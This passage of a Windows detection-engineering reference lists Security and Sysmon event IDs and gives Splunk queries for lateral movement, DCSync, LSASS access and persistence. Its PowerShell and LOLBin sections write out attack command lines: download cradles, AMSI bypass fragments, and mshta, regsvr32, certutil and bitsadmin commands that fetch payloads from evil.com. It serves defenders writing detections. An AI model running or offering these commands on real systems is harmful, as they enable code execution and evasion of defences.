| where SubjectUserName != SANs
| stats count by SubjectUserName, SANs, TemplateName, Computer

# Monitor CA configuration changes
index=windows EventCode=4899
| stats count by SubjectUserName, AttributeChange
```

---

## Critical Windows Events

### Authentication Events

```
┌───────────┬─────────────────────────────────────────────────────────────┐
│ EVENT ID  │ DESCRIPTION                                                 │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4624      │ Successful logon                                            │
│           │ Key fields: LogonType, TargetUserName, IpAddress,          │
│           │             WorkstationName, LogonProcessName               │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4625      │ Failed logon                                                │
│           │ Key fields: Status, SubStatus (failure reason),            │
│           │             TargetUserName, IpAddress                       │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4634      │ Account logoff                                              │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4647      │ User initiated logoff                                       │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4648      │ Explicit credential use (RunAs, net use with creds)        │
│           │ Key fields: SubjectUserName, TargetUserName, TargetServer  │
│           │ IMPORTANT: Indicates lateral movement                       │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4672      │ Special privileges assigned to logon                       │
│           │ Indicates: Admin logon, sensitive privilege use            │
│           │ Privileges: SeDebugPrivilege, SeTakeOwnershipPrivilege     │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4768      │ Kerberos TGT requested (AS-REQ)                            │
│           │ Key fields: TargetUserName, IpAddress, PreAuthType         │
│           │ Detection: AS-REP roasting (PreAuthType=0)                 │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4769      │ Kerberos service ticket requested (TGS-REQ)                │
│           │ Key fields: ServiceName, TargetUserName,                   │
│           │             TicketEncryptionType                            │
│           │ Detection: Kerberoasting (EncType=0x17)                    │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4771      │ Kerberos pre-authentication failed                         │
│           │ Key fields: TargetUserName, IpAddress, FailureCode         │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4776      │ NTLM credential validation                                  │
│           │ Key fields: TargetUserName, Workstation, Status            │
│           │ Detection: Pass-the-Hash (unusual workstation)             │
└───────────┴─────────────────────────────────────────────────────────────┘

LOGON TYPES (4624):
┌──────┬────────────────────┬─────────────────────────────────────────────┐
│ Type │ Name               │ Description / Detection Use                 │
├──────┼────────────────────┼─────────────────────────────────────────────┤
│  2   │ Interactive        │ Console logon (keyboard)                    │
│  3   │ Network            │ SMB, net use - common lateral movement      │
│  4   │ Batch              │ Scheduled task execution                    │
│  5   │ Service            │ Service start                               │
│  7   │ Unlock             │ Workstation unlock                          │
│  8   │ NetworkCleartext   │ IIS basic auth - cleartext creds           │
│  9   │ NewCredentials     │ RunAs /netonly - look for lateral movement │
│ 10   │ RemoteInteractive  │ RDP - track RDP chains                     │
│ 11   │ CachedInteractive  │ Cached credential use (offline)            │
└──────┴────────────────────┴─────────────────────────────────────────────┘

DETECTION QUERIES:

# Admin logon tracking
index=windows EventCode=4672
| stats count values(Computer) as systems by SubjectUserName
| where count > 5

# Lateral movement via explicit credentials
index=windows EventCode=4648
| where SubjectUserName!=TargetUserName
| stats count by SubjectUserName, TargetUserName, TargetServerName

# Failed logon analysis
index=windows EventCode=4625
| stats count by TargetUserName, IpAddress, Status, SubStatus
| sort - count

# RDP tracking
index=windows EventCode=4624 LogonType=10
| stats count by TargetUserName, IpAddress, Computer
```

### Process and Object Events

```
┌───────────┬─────────────────────────────────────────────────────────────┐
│ EVENT ID  │ DESCRIPTION                                                 │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4688      │ Process creation                                            │
│           │ Key fields: NewProcessName, CommandLine, ParentProcessName │
│           │ REQUIRES: Command line logging enabled                     │
│           │ GPO: Audit Process Creation > Include command line         │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4689      │ Process exit                                                │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4656      │ Handle to object requested                                  │
│           │ Key fields: ObjectType, ObjectName, AccessMask             │
│           │ Detection: SAM hive access, LSASS access                   │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4657      │ Registry value modified                                     │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4658      │ Handle to object closed                                     │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4660      │ Object deleted                                              │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4662      │ Operation performed on object                               │
│           │ Key fields: Properties (for DCSync detection)              │
│           │ Detection: DS-Replication-Get-Changes                      │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4663      │ Object access attempt                                       │
│           │ Key fields: ObjectType, ObjectName, AccessMask             │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4670      │ Object permissions changed                                  │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4697      │ Service installed                                           │
│           │ Similar to 7045 but in Security log                        │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4698      │ Scheduled task created                                      │
│           │ Key fields: TaskName, TaskContent (XML)                    │
│           │ Parse XML for actual command/action                        │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4699      │ Scheduled task deleted                                      │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4700      │ Scheduled task enabled                                      │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4701      │ Scheduled task disabled                                     │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4702      │ Scheduled task updated                                      │
└───────────┴─────────────────────────────────────────────────────────────┘

SYSTEM LOG EVENTS:
┌───────────┬─────────────────────────────────────────────────────────────┐
│ 7034      │ Service crashed unexpectedly                                │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 7035      │ Service sent start/stop control                            │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 7036      │ Service started/stopped                                     │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 7040      │ Service start type changed                                  │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 7045      │ Service installed                                           │
│           │ Key fields: ServiceName, ImagePath, ServiceType,           │
│           │             StartType, AccountName                          │
│           │ Detection: PsExec, suspicious services                     │
└───────────┴─────────────────────────────────────────────────────────────┘

DETECTION QUERIES:

# Suspicious service installation
index=windows EventCode=7045
| where NOT match(ImagePath, "(?i)c:\\\\windows|c:\\\\program files")
| stats count by ServiceName, ImagePath, AccountName

# Scheduled task persistence
index=windows EventCode=4698
| spath input=TaskContent
| eval action='Actions.Exec.Command'
| where NOT match(action, "(?i)microsoft|windows")
| stats count by TaskName, action, SubjectUserName
```

### Directory Service Events

```
┌───────────┬─────────────────────────────────────────────────────────────┐
│ EVENT ID  │ DESCRIPTION                                                 │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4662      │ Operation performed on AD object                            │
│           │ Detection: DCSync (replication rights)                     │
│           │ Properties: 1131f6aa (DS-Replication-Get-Changes)          │
│           │             1131f6ad (DS-Replication-Get-Changes-All)      │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4728      │ Member added to security-enabled global group              │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4729      │ Member removed from security-enabled global group          │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4732      │ Member added to security-enabled local group               │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4733      │ Member removed from security-enabled local group           │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4756      │ Member added to universal group                            │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4757      │ Member removed from universal group                        │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 4764      │ Group type changed                                          │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 5136      │ Directory object modified                                   │
│           │ Key fields: AttributeLDAPDisplayName, ObjectDN             │
│           │ Detection: GPO changes, AdminSDHolder, RBCD                │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 5137      │ Directory object created                                    │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 5138      │ Directory object undeleted                                  │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 5139      │ Directory object moved                                      │
├───────────┼─────────────────────────────────────────────────────────────┤
│ 5141      │ Directory object deleted                                    │
└───────────┴─────────────────────────────────────────────────────────────┘

DETECTION QUERIES:

# DCSync detection
index=windows EventCode=4662
| where Properties="*1131f6ad*" OR Properties="*1131f6aa*"
| where NOT match(SubjectUserName, "\\$$")  # Exclude computer accounts
| stats count by SubjectUserName, SubjectDomainName

# Privileged group changes
index=windows EventCode IN (4728, 4729, 4732, 4733, 4756, 4757)
| where TargetUserName IN ("Domain Admins", "Enterprise Admins",
                           "Administrators", "Schema Admins",
                           "Backup Operators", "Account Operators")
| stats count values(MemberName) as members by EventCode, TargetUserName

# GPO modifications
index=windows EventCode=5136
| where ObjectClass="groupPolicyContainer"
| stats count by ObjectDN, AttributeLDAPDisplayName, SubjectUserName

# RBCD configuration
index=windows EventCode=5136
| where AttributeLDAPDisplayName="msDS-AllowedToActOnBehalfOfOtherIdentity"
| stats count by ObjectDN, SubjectUserName, DSType
```

---

## Sysmon Event Reference

### Complete Event List

```
┌──────┬────────────────────────────────────────────────────────────────────┐
│ ID   │ EVENT TYPE & DETECTION USE CASES                                   │
├──────┼────────────────────────────────────────────────────────────────────┤
│  1   │ PROCESS CREATION                                                   │
│      │ Most valuable event. Contains:                                     │
│      │ - Image, CommandLine, ParentImage, ParentCommandLine               │
│      │ - User, Hashes, CurrentDirectory                                   │
│      │ - Process GUID for correlation                                     │
│      │ Detection: LOLBins, suspicious parent-child, encoded commands      │
├──────┼────────────────────────────────────────────────────────────────────┤
│  2   │ FILE CREATION TIME CHANGED                                         │
│      │ Timestomping detection                                              │
│      │ Attackers modify timestamps to blend in                            │
├──────┼────────────────────────────────────────────────────────────────────┤
│  3   │ NETWORK CONNECTION                                                 │
│      │ Contains: SourceIP/Port, DestIP/Port, Protocol, Image             │
│      │ Detection: C2 connections, beaconing, lateral movement            │
│      │ Note: Can be high volume; filter carefully                        │
├──────┼────────────────────────────────────────────────────────────────────┤
│  4   │ SYSMON SERVICE STATE CHANGED                                       │
│      │ Detection: Tampering with Sysmon                                   │
├──────┼────────────────────────────────────────────────────────────────────┤
│  5   │ PROCESS TERMINATED                                                 │
│      │ Use with Event 1 for process lifetime analysis                    │
├──────┼────────────────────────────────────────────────────────────────────┤
│  6   │ DRIVER LOADED                                                      │
│      │ Contains: Signature, SignatureStatus, Hashes                       │
│      │ Detection: Vulnerable drivers, unsigned drivers, rootkits         │
├──────┼────────────────────────────────────────────────────────────────────┤
│  7   │ IMAGE LOADED (DLL)                                                 │
│      │ Contains: Image, ImageLoaded, Hashes, Signed, Signature           │
│      │ Detection: DLL hijacking, reflective loading, unsigned DLLs      │
│      │ Note: Very high volume; filter to specific processes             │
├──────┼────────────────────────────────────────────────────────────────────┤
│  8   │ CREATEREMOTETHREAD                                                 │
│      │ Contains: SourceImage, TargetImage, SourceProcessGuid            │
│      │ Detection: Process injection, code injection                      │
│      │ High fidelity for injection detection                             │
├──────┼────────────────────────────────────────────────────────────────────┤
│  9   │ RAWACCESSREAD                                                      │
│      │ Raw disk access (bypassing filesystem)                            │
│      │ Detection: Credential dumping, forensic evasion                   │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 10   │ PROCESSACCESS                                                      │
│      │ Contains: SourceImage, TargetImage, GrantedAccess                 │
│      │ Detection: LSASS access, credential dumping                       │
│      │ Key for Mimikatz detection                                         │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 11   │ FILECREATE                                                         │
│      │ Contains: TargetFilename, Image, CreationUtcTime                  │
│      │ Detection: Malware drops, staging, persistence files             │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 12   │ REGISTRY OBJECT CREATED/DELETED                                    │
│      │ Registry key/value creation or deletion                           │
│      │ Detection: Persistence, configuration changes                     │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 13   │ REGISTRY VALUE SET                                                 │
│      │ Contains: TargetObject, Details (value), Image                    │
│      │ Detection: Run key persistence, settings modification            │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 14   │ REGISTRY KEY/VALUE RENAMED                                         │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 15   │ FILECREATESTREAMHASH                                               │
│      │ Alternate Data Stream creation                                     │
│      │ Detection: ADS-based hiding, Zone.Identifier                      │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 16   │ SYSMON CONFIGURATION CHANGE                                        │
│      │ Detection: Tampering with Sysmon config                           │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 17   │ PIPE CREATED                                                       │
│      │ Named pipe creation                                                │
│      │ Detection: Cobalt Strike pipes, PsExec pipes                     │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 18   │ PIPE CONNECTED                                                     │
│      │ Named pipe connection                                              │
│      │ Detection: Lateral movement via pipes                             │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 19   │ WMI EVENT FILTER ACTIVITY                                          │
│      │ WMI filter creation                                                │
│      │ Detection: WMI persistence (part 1 of 3)                          │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 20   │ WMI EVENT CONSUMER ACTIVITY                                        │
│      │ WMI consumer creation                                              │
│      │ Detection: WMI persistence (part 2 of 3)                          │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 21   │ WMI EVENT CONSUMER TO FILTER BINDING                               │
│      │ WMI filter-to-consumer binding                                     │
│      │ Detection: WMI persistence complete (part 3 of 3)                 │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 22   │ DNS QUERY                                                          │
│      │ Contains: QueryName, QueryStatus, QueryResults, Image             │
│      │ Detection: C2 domains, DGA, DNS tunneling                         │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 23   │ FILE DELETE                                                        │
│      │ File deletion (archived if configured)                            │
│      │ Detection: Evidence destruction, ransomware                       │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 24   │ CLIPBOARD CHANGE                                                   │
│      │ Clipboard content change                                           │
│      │ Detection: Data exfiltration via clipboard                        │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 25   │ PROCESS TAMPERING                                                  │
│      │ Process hollowing, herpaderping                                   │
│      │ Detection: Advanced injection techniques                          │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 26   │ FILE DELETE LOGGED                                                 │
│      │ File deletion with hash logged                                     │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 27   │ FILE BLOCK EXECUTABLE                                              │
│      │ Executable blocked by Sysmon                                       │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 28   │ FILE BLOCK SHREDDING                                               │
│      │ File shredding blocked                                             │
├──────┼────────────────────────────────────────────────────────────────────┤
│ 29   │ FILE EXECUTABLE DETECTED                                           │
│      │ PE file creation detected                                          │
└──────┴────────────────────────────────────────────────────────────────────┘
```

### High-Value Sysmon Detection Queries

```
# LSASS ACCESS (Credential Theft)
index=sysmon EventCode=10 TargetImage="*\\lsass.exe"
| where NOT SourceImage IN ("*\\csrss.exe", "*\\wininit.exe",
                            "*\\MsMpEng.exe", "*\\services.exe",
                            "*\\svchost.exe", "*\\lsass.exe",
                            "*\\taskmgr.exe", "*\\vmtoolsd.exe")
| stats count by SourceImage, SourceUser, GrantedAccess, Computer

# PROCESS INJECTION (CreateRemoteThread)
index=sysmon EventCode=8
| where SourceImage != TargetImage
| where NOT match(SourceImage, "(?i)csrss|dwm|winlogon|wininit")
| stats count by SourceImage, TargetImage, SourceUser

# SUSPICIOUS PARENT-CHILD
index=sysmon EventCode=1
| eval suspicious=case(
    match(ParentImage, "(?i)\\\\(excel|word|powerpoint|outlook)\\.exe$") AND
    match(Image, "(?i)\\\\(cmd|powershell|wscript|cscript|mshta)\\.exe$"), "office_spawn",

    match(ParentImage, "(?i)\\\\services\\.exe$") AND
    match(Image, "(?i)\\\\cmd\\.exe$"), "service_cmd",

    match(ParentImage, "(?i)\\\\wmiprvse\\.exe$") AND
    NOT match(Image, "(?i)\\\\(wmiprvse|scrcons|wbem)\\.exe$"), "wmi_spawn",

    1=1, "normal"
  )
| where suspicious!="normal"
| stats count by suspicious, ParentImage, Image, CommandLine

# COBALT STRIKE NAMED PIPES
index=sysmon EventCode IN (17, 18)
| where match(PipeName, "(?i)(msagent_|MSSE-|status_|postex_|
                          \\\\pipe\\\\[a-f0-9]{7,8})")
| stats count by PipeName, Image, User, Computer

# DNS TO SUSPICIOUS DOMAINS
index=sysmon EventCode=22
| where NOT match(QueryName, "(?i)microsoft|windows|google|
                              cloudflare|amazonaws")
| rex field=QueryName "(?<tld>[^.]+\\.[^.]+)$"
| stats count dc(QueryName) as unique_queries by Image, tld
| where unique_queries > 50

# UNSIGNED DLLS IN SYSTEM PROCESSES
index=sysmon EventCode=7 Signed="false"
| where match(Image, "(?i)svchost|lsass|services|explorer|winlogon")
| where NOT match(ImageLoaded, "(?i)c:\\\\windows")
| stats count by Image, ImageLoaded, Computer

# WMI PERSISTENCE CHAIN
index=sysmon EventCode IN (19, 20, 21)
| stats values(EventCode) as events, values(Name) as names,
        values(Consumer) as consumers by Computer, User
| where mvcount(events)=3  # All three WMI events
```

---

## PowerShell Attack Patterns

### Logging Configuration

```
SCRIPT BLOCK LOGGING (4104):
┌─────────────────────────────────────────────────────────────────────────┐
│ GPO Location:                                                           │
│ Computer Configuration > Administrative Templates >                     │
│ Windows Components > Windows PowerShell >                               │
│ "Turn on PowerShell Script Block Logging"                               │
│                                                                         │
│ What it logs:                                                           │
│ ├── Full script content (even if obfuscated)                           │
│ ├── Deobfuscated content after PowerShell processes it                 │
│ └── Both console and script-based execution                            │
│                                                                         │
│ Event ID: 4104 (Microsoft-Windows-PowerShell/Operational)              │
└─────────────────────────────────────────────────────────────────────────┘

MODULE LOGGING:
┌─────────────────────────────────────────────────────────────────────────┐
│ GPO: "Turn on Module Logging"                                           │
│ Registry: HKLM\SOFTWARE\Policies\Microsoft\Windows\PowerShell\         │
│           ModuleLogging                                                 │
│                                                                         │
│ What it logs:                                                           │
│ ├── Commands executed                                                   │
│ ├── Pipeline execution details                                         │
│ └── Script output (partial)                                            │
│                                                                         │
│ Note: High volume; consider enabling for specific modules              │
└─────────────────────────────────────────────────────────────────────────┘

TRANSCRIPTION:
┌─────────────────────────────────────────────────────────────────────────┐
│ GPO: "Turn on PowerShell Transcription"                                 │
│                                                                         │
│ What it logs:                                                           │
│ ├── Complete session input and output                                   │
│ ├── Saved to configurable directory                                    │
│ └── Includes timestamps and headers                                    │
│                                                                         │
│ Best for: Forensics, complete session reconstruction                   │
└─────────────────────────────────────────────────────────────────────────┘
```

### Attack Pattern Detection

```
DOWNLOAD CRADLES:
┌─────────────────────────────────────────────────────────────────────────┐
│ Pattern                                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ IEX (New-Object Net.WebClient).DownloadString('http://...')            │
│ IEX (IWR 'http://...').Content                                         │
│ Invoke-Expression (Invoke-WebRequest -Uri http://...)                  │
│ $wc = New-Object System.Net.WebClient; $wc.DownloadString('...')       │
│ [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocol]:: │
│   Tls12; IEX(...)                                                      │
│ Start-BitsTransfer -Source http://... -Destination ...                 │
│ Invoke-RestMethod -Uri http://... | IEX                                │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY:
index=windows EventCode=4104
| where match(ScriptBlockText, "(?i)(downloadstring|downloadfile|
              invoke-webrequest|iwr|Net\.WebClient|webclient|
              invoke-restmethod|irm|BitsTransfer|download)")
| rex field=ScriptBlockText "(?<url>https?://[^\s'\"]+)"
| stats count values(url) as urls by Computer, UserName

ENCODED COMMANDS:
┌─────────────────────────────────────────────────────────────────────────┐
│ powershell.exe -e [base64]                                             │
│ powershell.exe -enc [base64]                                           │
│ powershell.exe -EncodedCommand [base64]                                │
│ powershell.exe -ec [base64]                                            │
│                                                                         │
│ Commonly combined with:                                                 │
│ -WindowStyle Hidden (-W Hidden)                                        │
│ -ExecutionPolicy Bypass (-Exec Bypass)                                 │
│ -NoProfile (-NoP)                                                      │
│ -NonInteractive (-NonI)                                                │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY:
index=sysmon EventCode=1 Image="*\\powershell.exe"
| where match(CommandLine, "(?i)(-e\s|-en\s|-enc\s|-ec\s|
              -encodedcommand)")
| rex field=CommandLine "(?i)-e[ncodedcommand]*\s+(?<encoded>[A-Za-z0-9+/=]+)"
| eval decoded = if(len(encoded)>10, base64decode(encoded), "")
| table _time Computer User CommandLine decoded

AMSI BYPASS ATTEMPTS:
┌─────────────────────────────────────────────────────────────────────────┐
│ Common AMSI Bypass Patterns:                                            │
├─────────────────────────────────────────────────────────────────────────┤
│ [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')        │
│ 'AmsiInitFailed' property manipulation                                  │
│ sET-ItEM ('variable:'+'AMSI'+'Context') 1                              │
│ [Runtime.InteropServices.Marshal]:: calls                               │
│ amsi.dll patching                                                       │
│ Memory patching via WriteProcessMemory                                  │
│ PowerShell reflection to access AMSI internals                          │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY:
index=windows EventCode=4104
| where match(ScriptBlockText, "(?i)(amsi|amsiutils|amsiinitfailed|
              amsicontext|AmsiScanBuffer|SetProtectedState|
              Reflection\.Assembly.*GetType)")
| stats count values(ScriptBlockText) as scripts by Computer, UserName

OBFUSCATION DETECTION:
┌─────────────────────────────────────────────────────────────────────────┐
│ Obfuscation Indicators:                                                 │
├─────────────────────────────────────────────────────────────────────────┤
│ String concatenation: ('Down'+'loadStr'+'ing')                         │
│ Character substitution: [char]0x49 + [char]0x45 + [char]0x58           │
│ -join operator: -join [char[]](73,69,88)                               │
│ -replace: "XEI" -replace "X","I"                                       │
│ Tick marks: I`E`X or In`vo`ke-Ex`press`ion                             │
│ Format strings: "{0}{1}" -f 'IE','X'                                   │
│ Variable expansion: $var = 'IEX'; & $var                               │
│ Environment variables: $env:comspec                                     │
└─────────────────────────────────────────────────────────────────────────┘

DETECTION QUERY:
index=windows EventCode=4104
| eval special_chars = len(replace(ScriptBlockText, "[a-zA-Z0-9\s]", ""))
| eval total_chars = len(ScriptBlockText)
| eval obfuscation_ratio = special_chars / total_chars
| where obfuscation_ratio > 0.3
   OR match(ScriptBlockText, "(?i)(\[char\]|\-join|\-replace|
             \`[a-z]|Format|\.value\.invoke)")
| stats count by Computer, UserName, obfuscation_ratio
```

---

## LOLBins Complete Reference

```
EXECUTION LOLBINS:
┌─────────────────┬───────────────────────────────────────────────────────────┐
│ BINARY          │ ABUSE TECHNIQUE                                           │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ mshta.exe       │ mshta http://evil.com/mal.hta                             │
│                 │ mshta vbscript:Execute("...")                             │
│                 │ mshta javascript:a=new%20ActiveXObject("...")             │
│                 │ Detection: mshta.exe with http/vbscript/javascript args   │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ rundll32.exe    │ rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";  │
│                 │ rundll32.exe shell32.dll,Control_RunDLL payload.dll       │
│                 │ rundll32.exe url.dll,OpenURL file://c:\path\payload.hta   │
│                 │ Detection: rundll32 with javascript or suspicious DLL     │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ regsvr32.exe    │ regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll │
│                 │ regsvr32 /s /n /u /i:\\webdav\path\file.sct scrobj.dll   │
│                 │ "Squiblydoo" technique - executes scriptlets              │
│                 │ Detection: regsvr32 with /i: and http/\\                  │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ msiexec.exe     │ msiexec /q /i http://evil.com/malicious.msi              │
│                 │ msiexec /q /i \\webdav\path\malicious.msi                │
│                 │ Detection: msiexec with /i and http/\\                    │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ cmstp.exe       │ cmstp.exe /ni /s c:\temp\malicious.inf                   │
│                 │ UAC bypass and code execution via INF file               │
│                 │ Detection: cmstp.exe with /s or /ni and .inf             │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ wmic.exe        │ wmic process call create "payload.exe"                   │
│                 │ wmic /node:target process call create "..."              │
│                 │ wmic os get /format:http://evil.com/payload.xsl          │
│                 │ Detection: wmic with process call create or /format:http │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ forfiles.exe    │ forfiles /p c:\windows\system32 /m notepad.exe \         │
│                 │   /c "c:\temp\payload.exe"                               │
│                 │ Detection: forfiles with /c                               │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ pcalua.exe      │ pcalua.exe -a c:\temp\payload.exe                        │
│                 │ Program Compatibility Assistant - runs any executable    │
│                 │ Detection: pcalua.exe with -a                            │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ syncappvpublish │ SyncAppvPublishingServer.exe "n;payload"                 │
│ ingServer.exe   │ Executes PowerShell code                                  │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ control.exe     │ control.exe c:\temp\malicious.cpl                        │
│                 │ Executes DLL as CPL file                                  │
└─────────────────┴───────────────────────────────────────────────────────────┘

DOWNLOAD LOLBINS:
┌─────────────────┬───────────────────────────────────────────────────────────┐
│ certutil.exe    │ certutil -urlcache -split -f http://evil.com/mal.exe     │
│                 │ certutil -verifyctl -split -f http://evil.com/mal.exe    │
│                 │ Detection: certutil with -urlcache or -verifyctl and http │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ bitsadmin.exe   │ bitsadmin /transfer job /download /priority high \       │
│                 │   http://evil.com/mal.exe c:\temp\mal.exe                │
│                 │ Detection: bitsadmin with /transfer and http              │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ curl.exe        │ curl.exe -o c:\temp\mal.exe http://evil.com/mal.exe      │
│                 │ Built into Windows 10 1803+                               │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ wget.exe        │ Available via Windows Subsystem for Linux                 │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ desktopimgdown  │ desktopimgdownldr.exe /lockscreenurl:http://evil.com/... │
│ ldr.exe         │                                                           │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ esentutl.exe    │ esentutl.exe /y \\webdav\share\payload.exe /d out.exe /o │
│                 │ Copy files from WebDAV                                    │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ expand.exe      │ expand \\webdav\share\payload.cab c:\temp\payload.exe    │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ findstr.exe     │ findstr /V /L W3AllLov3DonaldTrump \\webdav\share\p.exe\ │
│                 │   > c:\temp\payload.exe                                   │
└─────────────────┴───────────────────────────────────────────────────────────┘

COMPILE/EXECUTE LOLBINS:
┌─────────────────┬───────────────────────────────────────────────────────────┐
│ csc.exe         │ csc.exe /out:payload.exe payload.cs                       │
│                 │ C# compiler - compile malicious code                      │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ msbuild.exe     │ msbuild.exe malicious.csproj                             │
│                 │ Can execute inline C# tasks                               │
│                 │ Detection: msbuild.exe with non-standard project files   │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ installutil.exe │ installutil.exe /logfile= /LogToConsole=false /U mal.exe │
│                 │ Executes code in [System.ComponentModel.RunInstaller]     │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ regasm.exe      │ regasm.exe /U malicious.dll                              │
│                 │ Executes code in assembly                                 │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ regsvcs.exe     │ regsvcs.exe malicious.dll                                │
│                 │ Similar to regasm                                         │
├─────────────────┼───────────────────────────────────────────────────────────┤
│ Microsoft.      │ Microsoft.Workflow.Compiler.exe test.txt results.txt     │
│ Workflow.       │ Compiles and executes XOML payloads                      │
│ Compiler.exe    │                                                           │
└─────────────────┴───────────────────────────────────────────────────────────┘

DETECTION QUERY - All LOLBins:
index=sysmon EventCode=1
| where (Image="*\\certutil.exe" AND match(CommandLine, "(?i)(-urlcache|-verifyctl|http)"))
   OR (Image="*\\mshta.exe" AND match(CommandLine, "(?i)(http|javascript|vbscript)"))
   OR (Image="*\\regsvr32.exe" AND match(CommandLine, "(?i)(/i:|scrobj)"))
   OR (Image="*\\msiexec.exe" AND match(CommandLine, "(?i)/i.*http"))
   OR (Image="*\\bitsadmin.exe" AND match(CommandLine, "(?i)/transfer"))
   OR (Image="*\\cmstp.exe" AND match(CommandLine, "(?i)(/s|/ni).*\\.inf"))
   OR (Image="*\\wmic.exe" AND match(CommandLine, "(?i)(process.*call.*create|/format:)"))
   OR (Image="*\\msbuild.exe" AND NOT match(CommandLine, "(?i)\\.sln$"))
   OR (Image="*\\installutil.exe" AND match(CommandLine, "(?i)/U"))
| stats count by Image, CommandLine, User, Computer
| sort - count
```

---

## Windows Persistence Mechanisms

```
REGISTRY-BASED PERSISTENCE:
┌─────────────────────────────────────────────────────────────────────────┐
│ LOCATION                              │ DETECTION                       │
├───────────────────────────────────────┼─────────────────────────────────┤
│ HKLM\SOFTWARE\Microsoft\Windows\      │ Sysmon Event 13                 │
│   CurrentVersion\Run                  │ Runs at every logon             │
├───────────────────────────────────────┼─────────────────────────────────┤
│ HKCU\SOFTWARE\Microsoft\Windows\      │ Per-user, runs at user logon    │
│   CurrentVersion\Run                  │                                 │
├───────────────────────────────────────┼─────────────────────────────────┤
│ HKLM\SOFTWARE\Microsoft\Windows\      │ Runs once, then deleted         │
│   CurrentVersion\RunOnce              │                                 │
├───────────────────────────────────────┼─────────────────────────────────┤
│ HKLM\SOFTWARE\Microsoft\Windows NT\   │ Winlogon modifications          │
│   CurrentVersion\Winlogon             │ Shell, Userinit values          │
│   - Shell (default: explorer.exe)     │ Very persistent, hard to remove │
│   - Userinit                          │                                 │
├───────────────────────────────────────┼─────────────────────────────────┤
│ HKLM\SYSTEM\CurrentControlSet\        │ Boot Execute programs           │
│   Control\Session Manager\            │ Run before Windows subsystem    │
│   BootExecute                         │                                 │
